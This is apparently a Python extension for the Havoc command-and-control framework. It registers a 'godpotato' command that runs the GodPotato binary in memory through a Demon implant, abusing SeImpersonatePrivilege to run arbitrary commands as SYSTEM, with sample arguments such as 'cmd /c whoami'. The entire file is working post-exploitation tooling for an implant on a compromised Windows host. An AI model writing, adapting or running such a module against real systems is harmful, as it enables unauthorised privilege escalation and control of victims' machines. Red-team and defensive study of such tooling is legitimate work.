#!/usr/bin/env python3
from havoc import Demon, RegisterCommand
import havocui
import os

BASE_DIR = os.path.dirname(os.path.realpath('__file__'))
GODPOTATO_BIN = f"{BASE_DIR}/data/extensions/Havoc-GodPotato/bin/GodPotato-NET4.exe"

if not os.path.exists(GODPOTATO_BIN):
    print(f"GodPotato-NET4.exe not found at {GODPOTATO_BIN}")
    print("Please run ./install.sh or manually place GodPotato-NET4.exe in the bin directory.")
    havocui.messagebox("Error occured !", f"GodPotato-NET4.exe not found at: {GODPOTATO_BIN}\n\nPlease run ./install.sh or manually place GodPotato-NET4.exe in the bin directory.")


def godpotato(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon(demonID)

    params = " " + " ".join(param)
    print(f"Params: {params}")

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon Inline Execute GodPotato and execute cmd")

    demon.DotnetInlineExecute(TaskID, GODPOTATO_BIN, params)

    return TaskID

RegisterCommand(godpotato, "", "godpotato", "Inline Execute GodPotato in order to abuse SeImpersonatePrivilege and run commands as SYSTEM", 0, "-cmd \"cmd /c command\"", "-cmd \"cmd /c whoami\"")